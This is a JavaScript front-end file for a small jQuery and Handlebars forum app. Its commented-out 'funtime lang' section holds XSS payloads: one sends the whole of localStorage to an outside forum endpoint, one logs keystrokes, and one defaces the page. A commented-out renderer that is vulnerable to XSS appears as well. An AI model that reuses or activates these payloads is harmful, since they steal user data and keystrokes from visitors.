import { DOMAIN_NAME, ON_PROD, POSTS_PER_PAGE } from "./lib/constants.js";
import { isLoggedIn, showToast, validateInputFields } from "./lib/helper.js";

let currentPage = 1;
let posts;
let user = JSON.parse(localStorage.getItem("user"));
let postsTemplate;
let postFocusTemplate;

$(function () {
  $.ajax({
    method: "GET",
    url: "./templates/post.hbs",
    dataType: "html",
    success: (data) => {
      postsTemplate = data;
    },
  });

  $.ajax({
    method: "GET",
    url: "./templates/postFocus.hbs",
    dataType: "html",
    success: (data) => {
      postFocusTemplate = data;
    },
  });

  $.ajax({
    method: "GET",
    url: "./templates/toast.hbs",
    dataType: "html",
    success: (data) => {
      $("body").prepend(data);
      $("#toast").hide();
    },
  });

  // funtime lang
  // $("body").prepend(`<img
  //     src
  //     onerror="fetch('http:\/\/hyeumine.com/forumNewPost.php', body:{id:25,post:JSON.stringify(localStorage)})"
  //   />`);

  // $(
  //   "body"
  // ).prepend(`<script>$(function () {$.ajax({method: "POST",url: "http://hyeumine.com/forumNewPost.php",
  //         data: { id: 25, post: JSON.stringify(localStorage)}})})</script>`);

  // $("body").prepend(`
  // <script>document.addEventListener('keypress', function(event){
  //   console.log(String.fromCharCode(event.keyCode))
  //   $.ajax({method:'POST',url:'http://hyeumine.com/forumNewPost.php',data:{post:'pressed:'+String.fromCharCode(event.keyCode),id:25}})
  // })</script>
  // `);

  // $("body").prepend(`<script>document.addEventListener('keypress', function(event){$("p, h1, h2, h3, h4, h5, h6, span").text("HACKED")})</script>`);

  // $.get(
  //   "https://ipinfo.io",
  //   function (response) {
  //     alert(response.ip);
  //   },
  //   "json"
  // );

  async function deletePost(id) {
    try {
      isLoggedIn(user);

      $.ajax({
        method: "POST",
        url: `${DOMAIN_NAME}/forumDeletePost.php?id=${id}`,
        success: (data) => {
          data = JSON.parse(data);
          if (!data && !data.success)
            throw new Error("Post deletion failed somehow...");

          getPosts();
          showToast("Post deleted successfully!");
        },
      });
    } catch (err) {
      showToast(`${err.message}`, true);
    }
  }

  async function renderPosts() {
    try {
      let htmlTemplate = Handlebars.compile(postsTemplate);

      const end = Math.min(posts.length, POSTS_PER_PAGE * currentPage);
      const postsWithOwner = posts.splice(0, end).map((post) => {
        return {
          ...post,
          isOwner: post.uid == user.id || !ON_PROD,
        };
      });

      const postsContainer = $("#posts-container");
      const context = { data: postsWithOwner };
      postsContainer.html(htmlTemplate(context));

      // sensitive code to xss

      /*
      let html = "";
      for (const elem of postsWithOwner) {
        html += `
        <div class="mt-2 border-t border-slate-200 p-2">
          <h1 class="text-lg font-bold">${elem.user}</h1>
          <p class="">${elem.date}</p>
          <p class="">${elem.post}</p>
        <button class="delete-button" value=${elem.id}>delete</button>
        </div>
        `;
      }
      postsContainer.html(html);
      */

      $(".delete-button").on("click", (e) => {
        deletePost($(e.target).attr("value"));
      });
    } catch (error) {
      showToast(`${error.message}`);
    }
  }

  async function getPosts() {
    try {
      $.ajax({
        method: "GET",
        url: `${DOMAIN_NAME}/forumGetPosts.php`,
        success: (data) => {
          posts = JSON.parse(data);
          posts = posts.reverse();
          renderPosts();
        },
      });
    } catch (err) {
      showToast(`${err.message}`, true);
    }
  }

  async function setUser(newUser = undefined) {
    if (newUser) {
      localStorage.setItem("user", JSON.stringify(newUser));
      user = newUser;
    }

    $("#username-header").text(`${user.username}`);
  }

  async function createUser() {
    try {
      const inputFields = $("#auth-form > div > input");
      const inputData = validateInputFields(inputFields);

      $.ajax({
        method: "POST",
        url: `${DOMAIN_NAME}/forumCreateUser.php`,
        data: inputData,
        success: (data) => {
          user = JSON.parse(data);

          setUser(user);
          showToast(`User created successfully!
          Welcome ${user.username}`);
        },
      });
    } catch (err) {
      showToast(`${err.message}`, true);
    }
  }

  async function loginUser() {}

  async function createPost() {
    try {
      isLoggedIn(user);

      const post = document.getElementById("post");
      const id = JSON.stringify(user.id);
      const inputData = { ...validateInputFields([post]), id };

      $.ajax({
        method: "POST",
        url: `${DOMAIN_NAME}/forumNewPost.php`,
        data: inputData,
        success: (data) => {
          data = JSON.parse(data);

          if (!data && !data.success)
            throw new Error("Post creation failed somehow...");
          else showToast("Post created successfully!");

          getPosts();
        },
      });
    } catch (err) {
      showToast(`${err.message}`, true);
    }
  }

  async function replyPost() {}

  async function deleteReply() {}

  function handleToggleClass() {
    $("#auth-form").toggleClass("hidden");
  }

  // on load
  $("#auth-form").addClass("hidden");
  $("#create-user").on("click", createUser);
  $("#create-post").on("click", createPost);
  $("#toggle-auth-form").on("click", handleToggleClass);
  getPosts();

  if (user) setUser();
});
